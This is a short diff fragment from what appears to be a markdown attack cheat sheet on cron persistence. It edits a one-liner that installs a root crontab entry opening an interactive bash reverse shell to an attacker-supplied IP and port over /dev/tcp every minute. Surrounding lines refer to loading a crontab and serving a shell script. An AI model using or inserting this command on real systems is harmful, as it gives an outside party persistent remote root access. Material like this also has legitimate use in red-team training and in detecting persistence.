@@ -85,7 +85,7 @@ printf "$CT" | crontab -
 
 As a one-liner
 ```bash
-echo "* * * * * root bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'\n"
+echo "* * * * * root bash -c 'bash -i >& /dev/tcp/$ip/$port 0>&1'"
 ```
 
 Serve shell script, for example:
